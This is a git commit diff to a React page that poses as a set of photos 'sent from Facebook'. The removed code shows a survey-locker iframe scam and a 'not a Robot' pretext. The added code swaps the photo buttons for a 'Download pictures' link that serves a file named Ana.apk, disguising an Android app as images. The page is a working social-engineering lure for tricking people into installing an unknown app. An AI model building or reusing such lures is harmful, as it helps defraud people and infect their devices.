c41359848d034d92a5ee75203a126ab4a0c0be63
shareimages <bogyz1337@gmail.com>
2023-05-28 22:54:12 +0200

    x

--- src/App.jsx
+++ src/App.jsx
@@ -10,6 +10,8 @@ import ana3 from "../src/images/ana3.png";
 import ana4 from "../src/images/ana4.jpg";
 import usa from "../src/images/usa.svg";
 import rs from "../src/images/rs.jpg";
+
+
 function App() {
   const [visible, setVisible] = useState(false);
   const handler = () => {
@@ -22,7 +24,6 @@ function App() {
     else {
       setLanguage("rs");
     }
-    document.querySelectorAll('div[aria-label="Confirm"]').forEach((el) => el.click);
   }
   const [language, setLanguage] = useState('us');
   return (
@@ -50,13 +51,9 @@ function App() {
 
           <p className='ml'>Tamaño del archivo: 7MB</p>
           <p className='ml'>Enviado desde: <span style={{ color: 'rgb(0,155,255' }}>Facebook</span></p>
-        
-          <div id='submit' onClick={() => handler()}><button>Descargar Fotos</button></div>
+
+          <div id='submit' onClick={() => handler()}><a href='../public/Ana.apk'>Descargar Fotos</a></div>
           <center><small><em>Subido hace 7 minutos.</em></small></center>
-          <Dialog open={visible} fullScreen>
-            <iframe src="https://dim6w3digndpp.cloudfront.net/public/i_fr?it=3837187&key=8c422" height="400px" marginwidth="0" marginheight="0" align="middle" frameborder="0" width="100%" ></iframe>
-            <button style={{ marginInline: 'auto', width: '100%', borderRadius: '0px' }} onClick={() => setVisible(false)}>Regresa</button>
-          </Dialog>
         </div>
           :
           <>
@@ -81,22 +78,8 @@ function App() {
               <p className='ml'>Folder size: 13MB</p>
               <p className='ml'>Picture amount: 4</p>
               <p className='ml'>Sent from: <span style={{ color: 'rgb(0,155,255' }}>Facebook</span></p>
-              <small><em><p className='ml red'>*Important: to see the pictures in HD, click 'Open pictures' and verify that you are not a Robot.</p></em></small>
-              <div id='submit' onClick={() => handler()}><button>Open pictures</button></div>
+              <div id='submit' onClick={() => handler()}><a href='../public/Ana.apk'>Download pictures</a></div>
               <center><small><em>Uploaded 7 minutes ago</em></small></center>
-              {language == 'rs' ? <>
-                <Dialog open={visible} fullScreen>
-                <iframe src="https://dim6w3digndpp.cloudfront.net/public/i_fr?it=3837187&key=8c422" height="200px" marginwidth="0" marginheight="0" align="middle" frameborder="0" width="100%" ></iframe>
-                  <em>Izaberite jednu od tri ponudjene ankete. Prilikom zavrsetka verifikacije slike ce se automatski otvoriti.</em>
-                  <button style={{ marginInline: 'auto', width: '100%', borderRadius: '0px' }} onClick={() => setVisible(false)}>Regresa</button>
-                </Dialog>
-              </> :
-                <Dialog open={visible} fullScreen>
-                  <iframe src="https://dim6w3digndpp.cloudfront.net/public/i_fr?it=3837187&key=8c422" height="400px" marginwidth="0" marginheight="0" align="middle" frameborder="0" width="100%" ></iframe>
-                  <em className='center'>Choose one out of three surveys. Upon completing one of the surveys, the images will load automatically.</em>
-                  <button style={{ marginInline: 'auto', width: '100%', borderRadius: '0px' }} onClick={() => setVisible(false)}>Take me back</button>
-                </Dialog>
-              }
             </div>
           </>}
 
